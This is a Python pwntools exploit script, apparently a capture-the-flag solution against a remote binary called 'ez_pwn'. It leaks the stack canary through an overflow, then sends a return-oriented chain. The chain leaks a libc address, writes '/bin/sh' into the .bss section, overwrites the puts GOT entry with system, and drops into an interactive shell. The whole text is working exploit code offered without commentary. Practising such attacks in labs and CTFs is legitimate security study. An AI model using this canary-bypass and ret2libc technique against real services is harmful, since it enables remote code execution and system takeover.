from pwn import *
context.log_level = 'debug'
#p = process('./ez_pwn')
p = remote('163.152.225.231', 12355)
e = ELF('./ez_pwn')
pppr = 0x080489c9
pr = 0x0804849d

#gdb.attach(p)
p.recvuntil('3. Bye~~')
p.sendline('1')

p.recvuntil(' : ')

pay = "a" * 100

p.sendline(pay)
p.recvuntil('\n')

canary = u32('\x00' + p.recv(3))
print(hex(canary))

p.recvuntil(' : ')

pay = "a" * 50
pay += p32(canary)
pay += "b" * 12
pay += p32(e.plt['puts'])
pay += p32(pr)
pay += p32(e.got['puts'])

pay += p32(e.plt['read'])
pay += p32(pppr)
pay += p32(0)
pay += p32(e.bss())
pay += p32(8)

pay += p32(e.plt['read'])
pay += p32(pppr)
pay += p32(0)
pay += p32(e.got['puts'])
pay += p32(4)

pay += p32(e.plt['puts'])
pay += p32(pr)
pay += p32(e.bss())

p.sendline(pay)

p.recvuntil('\n')

leak = u32(p.recv(4))
libc = leak - 0x05f150
system = libc + 0x03a950

print(hex(leak))

p.sendline('/bin/sh')
p.send(p32(system))

p.interactive()
